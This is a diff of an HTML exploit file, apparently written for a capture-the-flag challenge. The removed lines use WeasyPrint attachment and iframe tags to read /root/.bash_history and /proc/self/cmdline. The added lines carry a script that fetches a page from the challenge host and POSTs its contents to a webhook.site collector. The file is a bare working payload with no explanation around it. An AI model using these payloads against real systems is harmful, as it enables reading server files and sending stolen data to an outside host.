@@ -2,11 +2,19 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>WeasyPrint PDF Test</title>
-    <link rel=attachment href="file:///root/.bash_history">
+    <title>Exploit</title>
 </head>
 <body>
-    <h1>WeasyPrint PDF Test</h1>
-    <iframe src="file:///proc/self/cmdline">
+    <h1>Exploit</h1>
+    <script>
+    fetch("https://yolo.tjc.tf/do/712e635f-98ed-4d1e-b3be-f0a7845dc2c0").then((response) => {
+        return response.text();
+    }).then((text) => {
+        fetch("https://webhook.site/0611881c-bc41-45f3-a8c9-de17092c579a", {
+            method: "POST",
+            body: text
+        })
+    });
+    </script>
 </body>
 </html>
